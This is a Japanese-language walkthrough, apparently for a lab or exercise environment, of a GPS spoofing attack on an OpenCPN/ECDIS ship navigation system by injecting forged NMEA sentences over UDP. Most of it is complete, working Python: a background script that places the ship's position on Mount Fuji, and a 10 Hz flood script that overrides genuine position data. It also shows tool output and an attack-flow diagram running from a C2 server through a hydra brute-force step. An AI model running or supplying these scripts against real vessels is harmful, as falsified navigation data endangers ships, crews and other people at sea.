# 02. GPS スプーフィング（NMEA インジェクション）

**ターゲット:** `192.168.20.20:10110` (OpenCPN / ECDIS)  
**攻撃元:** `192.168.10.20` (Log-Server、侵入済み)

---

## Step 1 — 静的スプーフィング（富士山へワープ）

Log-Server 上から NMEA パケットを直接 OpenCPN に投げ込みます。  
`nohup` でバックグラウンド実行することでセッションが切れても継続します。

```bash
nohup python3 - <<'EOF' > /dev/null 2>&1 &
import socket, datetime, functools, time

def checksum(s):
    return f"{functools.reduce(lambda a, c: a ^ ord(c), s, 0):02X}"

TARGET = ("192.168.20.20", 10110)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

while True:
    now = datetime.datetime.utcnow()
    # 富士山山頂の座標
    body = f"GPRMC,{now.strftime('%H%M%S')}.00,A,3521.6360,N,13843.6380,E,0.0,0.0,{now.strftime('%d%m%y')},,,A"
    packet = f"${body}*{checksum(body)}\r\n"
    sock.sendto(packet.encode(), TARGET)
    time.sleep(0.5)
EOF
```

OpenCPN 上で船位が **富士山山頂（35°21.636'N, 138°43.638'E）** に移動すれば成功です。

---

## Step 2 — 動的スプーフィング（フラッド攻撃）

正規の GPS データより高頻度（10 Hz）で偽データを送り続け、  
正規データを上書きすることで船位を継続的に制御します。

```bash
python3 - <<'EOF'
import socket, datetime, functools, time

def checksum(s):
    return f"{functools.reduce(lambda a, c: a ^ ord(c), s, 0):02X}"

TARGET = ("192.168.20.20", 10110)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

lat, lon = 35.5300, 139.8000

print(f"Flood-injecting Tokyo Bay data to {TARGET}...")

try:
    while True:
        now = datetime.datetime.utcnow()
        lat_deg, lat_min = int(lat), (lat - int(lat)) * 60
        lon_deg, lon_min = int(lon), (lon - int(lon)) * 60

        lat_str = f"{lat_deg:02d}{lat_min:07.4f}"
        lon_str = f"{lon_deg:03d}{lon_min:07.4f}"

        body = f"GPRMC,{now.strftime('%H%M%S')}.00,A,{lat_str},N,{lon_str},E,12.0,180.0,{now.strftime('%d%m%y')},,,A"
        packet = f"${body}*{checksum(body)}\r\n"

        # 1 ループで 5 連続送信（バースト）して正規データを上書き
        for _ in range(5):
            sock.sendto(packet.encode(), TARGET)

        lat -= 0.0001
        time.sleep(0.1)  # 10 Hz
except KeyboardInterrupt:
    print("\nAttack stopped.")
EOF
```

**inject_nmea.py を使う場合（Log-Server に配置済み）：**

```bash
admin@log-server:~$ python3 inject_nmea.py
[*] Injecting spoofed GPS to 192.168.20.20:10110
[Injected] $GPRMC,053025,A,3413.5060,N,13251.9660,E,12.0,45.0,240426,,*13
[Injected] $GPRMC,053026,A,3413.5120,N,13251.9720,E,12.0,45.0,240426,,*10
...
```

---

## 攻撃フロー全体図

```
C2-Server (192.168.5.30)
    │
    │  hydra ブルートフォース
    ▼
Log-Server (192.168.10.20)  ←── 侵入済み
    │
    │  偽 NMEA パケット UDP:10110
    ▼
OpenCPN / ECDIS (192.168.20.20)  ←── 船位が書き換えられる
```
